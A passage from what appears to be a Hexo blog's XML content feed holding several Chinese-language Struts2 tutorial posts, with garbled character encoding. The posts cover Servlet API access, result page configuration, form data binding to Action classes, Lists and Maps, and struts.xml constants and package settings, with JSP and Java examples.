align=&quot;center&quot;&gt;æ–¹å¼äºŒ:ä½¿ç”¨åŸç”Ÿçš„æ–¹å¼è®¿é—®&lt;/h3&gt;    &lt;form action=&quot;requestDemo2.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;å§“å:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¯†ç :&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//ä½¿ç”¨ServletAPIåŸç”Ÿçš„æ–¹å¼public class RequestDemo2 extends ActionSupport {    public String execute() {        // æ¥æ”¶æ•°æ®        // ä½¿ç”¨ServletActionContextç›´æ¥è·å¾—Requestå¯¹è±¡        HttpServletRequest request = ServletActionContext.getRequest();        Map&lt;String, String[]&gt; map = request.getParameterMap();        for (String key : map.keySet()) {            String[] value = map.get(key);            System.out.println(key + &quot;\t&quot; + Arrays.toString(value));        }        // å‘åŸŸå¯¹è±¡ä¸­å­˜å…¥æ•°æ®        request.setAttribute(&quot;reqName&quot;, &quot;reqValue&quot;);// å‘Requestä¸­å­˜å…¥æ•°æ®        request.getSession().setAttribute(&quot;sessionName&quot;, &quot;sessValue&quot;);// å‘sessionä¸­å­˜å…¥æ•°æ®        ServletActionContext.getServletContext().setAttribute(&quot;appName&quot;, &quot;appValue&quot;);// å‘applicationä¸­å­˜å…¥æ•°æ®        return SUCCESS;    }}</code></pre><h1 id="æ¥å£æ³¨å…¥"><a href="#æ¥å£æ³¨å…¥" class="headerlink" title="æ¥å£æ³¨å…¥"></a>æ¥å£æ³¨å…¥</h1><p>JSP</p><pre><code>&lt;h3 align=&quot;center&quot;&gt;æ–¹å¼äºŒ:ä½¿ç”¨æ¥å£æ³¨å…¥çš„æ–¹å¼è®¿é—®&lt;/h3&gt;    &lt;form action=&quot;requestDemo3.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;å§“å:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¯†ç :&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>public class RequestDemo3 extends ActionSupport implements ServletRequestAware, ServletContextAware {    private HttpServletRequest request;    private ServletContext context;    public String execute() throws Exception {        // æ¥æ”¶å‚æ•°        // é€šè¿‡æ¥å£æ³¨å…¥çš„æ–¹å¼è·å¾—requestå¯¹è±¡        Map&lt;String, String[]&gt; map = request.getParameterMap();        for (String key : map.keySet()) {            String[] value = map.get(key);            System.out.println(key + &quot;\t&quot; + Arrays.toString(value));        }        // å‘åŸŸå¯¹è±¡ä¸­ä¿å­˜æ•°æ®        request.setAttribute(&quot;reqName&quot;, &quot;reqValue&quot;); // å‘requeståŸŸä¸­ä¿å­˜æ•°æ®        request.getSession().setAttribute(&quot;sessionName&quot;, &quot;sessionValue&quot;);// å‘sessionä¸­ä¿å­˜æ•°æ®        context.setAttribute(&quot;appName&quot;, &quot;appValue&quot;);        return super.execute();    }    public void setServletRequest(HttpServletRequest request) {        this.request = request;    }    public void setServletContext(ServletContext context) {        this.context = context;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2çš„ç»“æœé¡µé¢çš„é…ç½®</title>
      <link href="/2018/12/22/struts2-de-jie-guo-ye-mian-de-pei-zhi/"/>
      <url>/2018/12/22/struts2-de-jie-guo-ye-mian-de-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¨å±€ç»“æœé¡µé¢"><a href="#å…¨å±€ç»“æœé¡µé¢" class="headerlink" title="å…¨å±€ç»“æœé¡µé¢"></a>å…¨å±€ç»“æœé¡µé¢</h1><p>å…¨å±€ç»“æœé¡µé¢æŒ‡çš„æ˜¯ï¼Œåœ¨åŒ…ä¸­é…ç½®ä¸€æ¬¡ï¼Œå…¶ä»–çš„åœ¨<strong>è¿™ä¸ªåŒ…ä¸­çš„æ‰€æœ‰çš„actionåªè¦è¿”å›äº†è¿™ä¸ªå€¼</strong>ï¼Œ<strong>éƒ½å¯ä»¥è·³è½¬åˆ°è¿™ä¸ªé¡µé¢ã€‚</strong></p><p><strong>é’ˆå¯¹è¿™ä¸ªåŒ…ä¸‹çš„æ‰€æœ‰çš„actionçš„é…ç½®éƒ½æœ‰æ•ˆ</strong></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;demo1&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;        &lt;!-- å…¨å±€ç»“æœé¡µé¢çš„é…ç½® --&gt;        &lt;global-results&gt;            &lt;result name=&quot;success&quot;&gt;/demo1/demo2.jsp&lt;/result&gt;        &lt;/global-results&gt;        &lt;action name=&quot;requestDemo1&quot; class=&quot;demo1.RequestDemo1&quot;&gt;            &lt;!-- è¿™é‡Œé…ç½®çš„resultç»“æœé¡µé¢æ˜¯å±€éƒ¨çš„ --&gt;            &lt;!-- &lt;result name=&quot;success&quot;&gt;/demo1/demo2.jsp&lt;/result&gt; --&gt;        &lt;/action&gt;        &lt;action name=&quot;requestDemo2&quot; class=&quot;demo1.RequestDemo2&quot;&gt;        &lt;/action&gt;        &lt;action name=&quot;requestDemo3&quot; class=&quot;demo1.RequestDemo3&quot;&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><h1 id="å±€éƒ¨ç»“æœé¡µé¢"><a href="#å±€éƒ¨ç»“æœé¡µé¢" class="headerlink" title="å±€éƒ¨ç»“æœé¡µé¢"></a>å±€éƒ¨ç»“æœé¡µé¢</h1><p>å±€éƒ¨ç»“æœé¡µé¢æŒ‡çš„æ˜¯ï¼Œ<strong>åªèƒ½åœ¨å½“å‰çš„actionä¸­çš„é…ç½®æœ‰æ•ˆã€‚</strong></p><p><strong>é’ˆå¯¹å½“å‰çš„actionæœ‰æ•ˆã€‚</strong></p><h1 id="Resultæ ‡ç­¾çš„é…ç½®"><a href="#Resultæ ‡ç­¾çš„é…ç½®" class="headerlink" title="Resultæ ‡ç­¾çš„é…ç½®"></a>Resultæ ‡ç­¾çš„é…ç½®</h1><p>resultæ ‡ç­¾çš„ä½œç”¨:é…ç½®é¡µé¢çš„è·³è½¬</p><p>å±æ€§:</p><ul><li>nameå±æ€§:<strong>é€»è¾‘è§†å›¾çš„åç§°ã€‚é»˜è®¤å€¼ï¼šsuccess</strong></li><li>typeå±æ€§:é¡µé¢è·³è½¬ç±»å‹<ul><li><strong>dispatcherï¼šé»˜è®¤å€¼ï¼Œè¯·æ±‚è½¬å‘ã€‚ï¼ˆActionè½¬å‘JSPï¼‰</strong></li><li><strong>redirectï¼šé‡å®šå‘ã€‚ï¼ˆActioné‡å®šå‘JSPï¼‰</strong></li><li>chainï¼šè½¬å‘.ï¼ˆActionè½¬å‘Actionï¼‰</li><li>redirectActionï¼šé‡å®šå‘.ï¼ˆActioné‡å®šå‘Action</li><li>streamï¼šStruts2ä¸­æä¾›æ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2çš„æ•°æ®å°è£…</title>
      <link href="/2018/12/22/struts2-de-shu-ju-feng-zhuang/"/>
      <url>/2018/12/22/struts2-de-shu-ju-feng-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="å±æ€§é©±åŠ¨-å¿…é¡»æä¾›å±æ€§çš„setæ–¹æ³•-ä¸å¸¸ç”¨"><a href="#å±æ€§é©±åŠ¨-å¿…é¡»æä¾›å±æ€§çš„setæ–¹æ³•-ä¸å¸¸ç”¨" class="headerlink" title="å±æ€§é©±åŠ¨:å¿…é¡»æä¾›å±æ€§çš„setæ–¹æ³•(ä¸å¸¸ç”¨)"></a>å±æ€§é©±åŠ¨:å¿…é¡»æä¾›å±æ€§çš„setæ–¹æ³•(ä¸å¸¸ç”¨)</h1><p>jspé¡µé¢</p><pre><code>&lt;h3&gt;æ–¹å¼ä¸€:å±æ€§é©±åŠ¨-æä¾›setæ–¹æ³•çš„æ–¹å¼&lt;/h3&gt;    &lt;form action=&quot;userAction1.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;ç”¨æˆ·å:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¯†ç :&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¹´é¾„:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;ç”Ÿæ—¥:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;birthday&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å·¥èµ„:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;salary&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                    &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//æ•°æ®å°è£…çš„æ–¹å¼ä¸€:å±æ€§é©±åŠ¨-æä¾›å±æ€§çš„setæ–¹æ³•çš„æ–¹å¼public class UserAction1 extends ActionSupport {    //æä¾›äº†å¯¹åº”çš„å±æ€§    private String username;    private String password;    private Integer age;    private Date birthday;    private Double salary;    //æä¾›å±æ€§æ‰€å¯¹åº”çš„setæ–¹æ³•    public void setUsername(String username) {        this.username = username;    }    public void setPassword(String password) {        this.password = password;    }    public void setAge(Integer age) {        this.age = age;    }    public void setBirthday(Date birthday) {        this.birthday = birthday;    }    public void setSalary(Double salary) {        this.salary = salary;    }    public String execute(){        //æ¥æ”¶æ•°æ®        System.out.println(username);        System.out.println(password);        System.out.println(age);        System.out.println(birthday);        System.out.println(salary);        //å°è£…æ•°æ®        User user = new User();        user.setUsername(username);        user.setPassword(password);        user.setAge(age);        user.setBirthday(birthday);        user.setSalary(salary);        return NONE;    }}</code></pre><h1 id="å±æ€§é©±åŠ¨-é¡µé¢æä¾›è¡¨è¾¾å¼"><a href="#å±æ€§é©±åŠ¨-é¡µé¢æä¾›è¡¨è¾¾å¼" class="headerlink" title="å±æ€§é©±åŠ¨:é¡µé¢æä¾›è¡¨è¾¾å¼"></a>å±æ€§é©±åŠ¨:é¡µé¢æä¾›è¡¨è¾¾å¼</h1><p>JSP</p><pre><code>&lt;h3&gt;æ–¹å¼äºŒ:å±æ€§é©±åŠ¨-é¡µé¢ä¸­æä¾›è¡¨è¾¾å¼çš„å†™æ³•&lt;/h3&gt;    &lt;form action=&quot;userAction2.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;ç”¨æˆ·å:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.username&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¯†ç :&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;password&quot; name=&quot;user.password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¹´é¾„:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.age&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;ç”Ÿæ—¥:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.birthday&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å·¥èµ„:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.salary&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                    &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//æ•°æ®å°è£…çš„æ–¹å¼äºŒ:å±æ€§é©±åŠ¨-åœ¨é¡µé¢ä¸­æä¾›è¡¨è¾¾å¼çš„æ–¹å¼public class UserAction2 extends ActionSupport {    // æä¾›ä¸€ä¸ªç§æœ‰å¯¹è±¡    private User user;    //æ‹¦æˆªå™¨è¿›è¡Œçš„æ•°æ®å°è£…    // æä¾›userçš„setå’Œgetæ–¹æ³•:getæ–¹æ³•æ˜¯å¿…é¡»çš„    public User getUser() {        return user;    }    public void setUser(User user) {        this.user = user;    }    public String execute() {        System.out.println(user);        return NONE;    }}</code></pre><h1 id="æ¨¡å‹é©±åŠ¨-å®ç°ModelDrivenæ¥å£-å¸¸ç”¨"><a href="#æ¨¡å‹é©±åŠ¨-å®ç°ModelDrivenæ¥å£-å¸¸ç”¨" class="headerlink" title="æ¨¡å‹é©±åŠ¨:å®ç°ModelDrivenæ¥å£(å¸¸ç”¨)"></a>æ¨¡å‹é©±åŠ¨:å®ç°ModelDrivenæ¥å£(å¸¸ç”¨)</h1><p>JSP</p><pre><code>&lt;h3&gt;æ–¹å¼ä¸€:æ¨¡å‹é©±åŠ¨-æ¨¡å‹é©±åŠ¨çš„æ–¹å¼&lt;/h3&gt;    &lt;form action=&quot;userAction3&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;ç”¨æˆ·å:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¯†ç :&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¹´é¾„:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;ç”Ÿæ—¥:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;birthday&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å·¥èµ„:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;salary&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                    &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//æ•°æ®å°è£…çš„æ–¹å¼3:é‡‡ç”¨æ¨¡å‹é©±åŠ¨çš„æ–¹å¼public class UserAction3 extends ActionSupport implements ModelDriven&lt;User&gt; {    private User user = new User(); // æ¨¡å‹é©±åŠ¨çš„æ–¹å¼å¿…é¡»æ‰‹åŠ¨æä¾›å¯¹è±¡çš„å®ä¾‹    public User getModel() {        // æ¨¡å‹é©±åŠ¨éœ€è¦ä½¿ç”¨çš„æ–¹æ³•        return user;    //è¿™é‡Œå¿…é¡»è¿”å›ä¸Šé¢é‚£ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡    }    public String execute() {        System.out.println(user);        return NONE;    }}</code></pre><h1 id="å¤æ‚çš„æ•°æ®å°è£…"><a href="#å¤æ‚çš„æ•°æ®å°è£…" class="headerlink" title="å¤æ‚çš„æ•°æ®å°è£…"></a>å¤æ‚çš„æ•°æ®å°è£…</h1><h2 id="å°†æ•°æ®å°è£…åˆ°Listä¸­"><a href="#å°†æ•°æ®å°è£…åˆ°Listä¸­" class="headerlink" title="å°†æ•°æ®å°è£…åˆ°Listä¸­"></a>å°†æ•°æ®å°è£…åˆ°Listä¸­</h2><pre><code>&lt;h3 align=&quot;center&quot;&gt;1:å°è£…åˆ°Listé›†åˆä¸­:æ‰¹é‡æ’å…¥å•†å“&lt;/h3&gt;    &lt;form action=&quot;goodsAction1.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“åç§°&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[0].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“ä»·æ ¼&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[0].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“åç§°&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[1].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“ä»·æ ¼&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[1].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“åç§°&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[2].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“ä»·æ ¼&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[2].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>public class GoodsAction1 extends ActionSupport {    private List&lt;Goods&gt; goods;    public void setGoods(List&lt;Goods&gt; goods) {        this.goods = goods;    }    public List&lt;Goods&gt; getGoods() {        return goods;    }    public String execute() {        for (Goods good : goods) {            System.out.println(good);        }        return NONE;    }}</code></pre><h2 id="å°†æ•°æ®å°è£…åˆ°"><a href="#å°†æ•°æ®å°è£…åˆ°" class="headerlink" title="å°†æ•°æ®å°è£…åˆ°"></a>å°†æ•°æ®å°è£…åˆ°</h2><p>JSP</p><pre><code>h3 align=&quot;center&quot;&gt;1:å°è£…åˆ°mapé›†åˆä¸­:æ‰¹é‡æ’å…¥å•†å“&lt;/h3&gt;    &lt;form action=&quot;goodsAction2.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“åç§°&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;one&#39;].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“ä»·æ ¼&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;one&#39;].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“åç§°&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;two&#39;].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“ä»·æ ¼&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;two&#39;].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“åç§°&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;three&#39;].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å•†å“ä»·æ ¼&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;three&#39;].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>import java.util.Map;import com.opensymphony.xwork2.ActionSupport;import domain.Goods;public class GoodsAction2 extends ActionSupport {    private Map&lt;String,Goods&gt; map;            public Map&lt;String, Goods&gt; getMap() {        return map;    }    public void setMap(Map&lt;String, Goods&gt; map) {        this.map = map;    }    public String execute(){        for (String key : map.keySet()) {            Goods goods = map.get(key);                    System.out.println(key + &quot;\t&quot; + goods);        }        return NONE;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2å¸¸è§é…ç½®</title>
      <link href="/2018/12/22/struts2-chang-jian-pei-zhi/"/>
      <url>/2018/12/22/struts2-chang-jian-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="é…ç½®XMLæç¤º"><a href="#é…ç½®XMLæç¤º" class="headerlink" title="é…ç½®XMLæç¤º"></a>é…ç½®XMLæç¤º</h1><h1 id="Actionçš„é…ç½®"><a href="#Actionçš„é…ç½®" class="headerlink" title="Actionçš„é…ç½®"></a>Actionçš„é…ç½®</h1><h2 id="packageæ ‡ç­¾é…ç½®"><a href="#packageæ ‡ç­¾é…ç½®" class="headerlink" title="packageæ ‡ç­¾é…ç½®"></a>packageæ ‡ç­¾é…ç½®</h2><p>packageæ ‡ç­¾æ˜¯åŒ…,ä»–çš„ä½œç”¨æ˜¯ä¸ºäº†æ›´å¥½çš„ç®¡ç†Action.</p><p>packageæ ‡ç­¾çš„å¸¸ç”¨å±æ€§</p><ul><li>name:åŒ…çš„åç§°,åœ¨ä¸€ä¸ªStruts2é¡¹ç›®ä¸­å¯ä»¥éšä¾¿å®šä¹‰,åªè¦<strong>ä¸é‡åå³å¯</strong></li><li>extends:ç»§æ‰¿çš„åŒ…,ä¸€èˆ¬<strong>ç»§æ‰¿struts-default</strong></li><li>namespace:åç§°ç©ºé—´,<strong>ä¸actionæ ‡ç­¾ä¸­çš„nameå±æ€§å…±åŒå†³å®šäº†è®¿é—®è·¯å¾„</strong><ul><li>åç§°ç©ºé—´çš„ä¸‰ç§ä¸åŒçš„å†™æ³•<ul><li>å¸¦åç§°çš„åç§°ç©ºé—´:namespace=â€/testâ€</li><li><strong>æ ¹åç§°ç©ºé—´:namespace=â€/â€œ</strong></li><li>é»˜è®¤åç§°ç©ºé—´:namespace=â€â€</li></ul></li></ul></li><li>abstract:å£°æ˜åŒ…æ˜¯æŠ½è±¡åŒ…</li></ul><h2 id="Actionæ ‡ç­¾çš„é…ç½®"><a href="#Actionæ ‡ç­¾çš„é…ç½®" class="headerlink" title="Actionæ ‡ç­¾çš„é…ç½®"></a>Actionæ ‡ç­¾çš„é…ç½®</h2><p>Actionæ ‡ç­¾å°†æ ‡è¯†ç¬¦æ˜ å°„åˆ°å¤„ç†ç¨‹åºç±»ã€‚å½“è¯·æ±‚ä¸æ“ä½œåç§°åŒ¹é…æ—¶ï¼Œæ¡†æ¶ä½¿ç”¨æ˜ å°„æ¥ç¡®å®šå¦‚ä½•å¤„ç†è¯·æ±‚ã€‚</p><p>actionæ ‡ç­¾çš„å¸¸ç”¨å±æ€§</p><ul><li><strong>name:ä¸namespaceå…±åŒå†³å®šæµè§ˆå™¨è®¿é—®è·¯å¾„</strong><ul><li>å‡å¦‚è¯·æ±‚<a href="http://www.planetstruts.org/struts2-mailreader/**Welcome.actionå°†æ˜ å°„åˆ°Welcomeç±»å»æ“ä½œ*" target="_blank" rel="noopener">http://www.planetstruts.org/struts2-mailreader/**Welcome.actionå°†æ˜ å°„åˆ°Welcomeç±»å»æ“ä½œ*</a>*</li></ul></li><li>class:<strong>Actionç±»çš„å…¨è·¯å¾„</strong></li><li>method:<strong>ç”¨äºç¡®å®šæ‰§è¡ŒActionç±»ä¸­çš„æŸä¸ªæ–¹æ³•,é»˜è®¤æ‰§è¡Œçš„æ˜¯Actionç±»ä¸­çš„executeæ–¹æ³•</strong></li><li>converter:Struts2æ¡†æ¶ä¸­çš„ç±»å‹è½¬æ¢</li></ul><h1 id="å¸¸é‡é…ç½®"><a href="#å¸¸é‡é…ç½®" class="headerlink" title="å¸¸é‡é…ç½®"></a>å¸¸é‡é…ç½®</h1><h2 id="Strutså¸¸é‡é…ç½®"><a href="#Strutså¸¸é‡é…ç½®" class="headerlink" title="Strutså¸¸é‡é…ç½®"></a>Strutså¸¸é‡é…ç½®</h2><p>æŸ¥çœ‹Strutså¸¸é‡</p><p><strong>/org/apache/struts2/default.properties</strong></p><p><img src="" alt="å¸¸è§é…ç½®"></p><ul><li>struts.i18n.encoding=UTF-8:<strong>Struts2æ¡†æ¶é»˜è®¤ç¼–ç æ ¼å¼æ˜¯UTF-8</strong></li><li>struts.action.extension=action:Struts2è¯·æ±‚çš„<strong>é»˜è®¤æ‰©å±•å</strong></li></ul><p>ä¿®æ”¹å¸¸é‡çš„å€¼çš„æ–¹æ³•</p><ul><li>åœ¨struts.xmlä¸­ä¿®æ”¹å¸¸é‡<strong>(å¸¸ç”¨æ–¹æ³•)</strong><ul><li><img src="" alt="ä¿®æ”¹å¸¸é‡"></li></ul></li><li>ç›´æ¥ä¿®æ”¹default.properties</li><li>é€šè¿‡web.xmlä¿®æ”¹å¸¸é‡</li></ul><h2 id="å¤šä¸ªStruts-xmlé…ç½®æ–‡ä»¶çš„é…ç½®"><a href="#å¤šä¸ªStruts-xmlé…ç½®æ–‡ä»¶çš„é…ç½®" class="headerlink" title="å¤šä¸ªStruts.xmlé…ç½®æ–‡ä»¶çš„é…ç½®"></a>å¤šä¸ªStruts.xmlé…ç½®æ–‡ä»¶çš„é…ç½®</h2><p>å½“æˆ‘ä»¬æœ‰å¤šä¸ªåŒ…çš„æ—¶å€™,ä¸èƒ½å°†æ‰€æœ‰çš„strutsé…ç½®éƒ½å†™åœ¨ä¸€ä¸ªstruts.xmlæ–‡ä»¶ä¸­,è¿™æ ·çš„åšæ³•ä¼šç»™æˆ‘ä»¬åæœŸç»´æŠ¤å¸¦æ¥é˜»ç¢.å¯¹äºå¤§å‹åº”ç”¨ç¨‹åºï¼Œæœ€å¥½ä½¿ç”¨å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œä»¥ä¾¿ç®¡ç†åº”ç”¨ç¨‹åº</p><p>å¯ä»¥åˆ›å»ºè®¸å¤šé…ç½®æ–‡ä»¶ï¼Œä½†éœ€è¦åœ¨struts.xmlæ–‡ä»¶ä¸­å®šä¹‰å®ƒã€‚<strong>strutsçš„includeå­å…ƒç´ ç”¨äºå®šä¹‰æ”¯æŒçš„é…ç½®æ–‡ä»¶ã€‚</strong></p><p><img src="" alt="å¤šé…ç½®æ–‡ä»¶"></p><h1 id="Actionçš„å†™æ³•"><a href="#Actionçš„å†™æ³•" class="headerlink" title="Actionçš„å†™æ³•"></a>Actionçš„å†™æ³•</h1><h2 id="Actionç±»æ˜¯ä¸€ä¸ªPOJO"><a href="#Actionç±»æ˜¯ä¸€ä¸ªPOJO" class="headerlink" title="Actionç±»æ˜¯ä¸€ä¸ªPOJO"></a>Actionç±»æ˜¯ä¸€ä¸ªPOJO</h2><p><img src="" alt="POJO"><br>ç»´åŸºç™¾ç§‘å¯¹POJOçš„æè¿°:</p><blockquote><p>åœ¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œæ™®é€šæ—§Javaå¯¹è±¡ï¼ˆPOJOï¼‰æ˜¯ä¸€ä¸ªæ™®é€šçš„Java å¯¹è±¡ï¼Œä¸å—ä»»ä½•ç‰¹æ®Šé™åˆ¶çš„çº¦æŸï¼Œä¹Ÿä¸éœ€è¦ä»»ä½•ç±»è·¯å¾„ã€‚è¯¥æœ¯è¯­ç”±Martin Fowlerï¼ŒRebecca Parsonså’ŒJosh 